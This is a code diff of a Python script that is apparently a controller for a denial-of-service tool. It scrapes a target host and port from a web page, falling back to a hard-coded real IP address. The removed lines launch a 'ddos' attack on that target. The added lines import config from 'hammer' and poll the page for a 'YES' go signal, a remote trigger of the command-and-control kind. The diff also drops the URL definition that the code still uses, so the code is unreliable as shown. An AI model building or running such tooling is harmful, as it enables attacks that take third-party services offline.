@@ -1,24 +1,28 @@
-from ddos import main as ddos
-
-import sys, requests
+import requests
 
 from bs4 import BeautifulSoup
 
-URL = 'http://localhost:3000'
+
+from hammer import config
+
+html = None
 
 def get_html():
   req = requests.get(URL)
   soup = BeautifulSoup(req.text)
 
-  global parsed
-  parsed = soup.body
+  global html
+  html = soup.body
+
 
 def get_data():
+  get_html()
+
   addr = {}
   # get html from website
-  get_html()
+  
   # get formatted data config
-  data = parsed.h2.get_text().strip().split(':')
+  data = html.h2.get_text().strip().split(':')
 
   try: addr["host"] = data[0]
   except: addr["host"] = '77.88.55.55'
@@ -28,9 +32,11 @@ def get_data():
 
   return addr
 
-def main():
-  data = get_data()
-  ddos(_host=data["host"], _port=data["port"])
 
-if __name__ == '__main__':
-  main()
+def is_needed():
+  if html is None:
+    get_html()
+
+  needed = html.h1.get_text().strip()
+
+  return needed.upper() == 'YES'
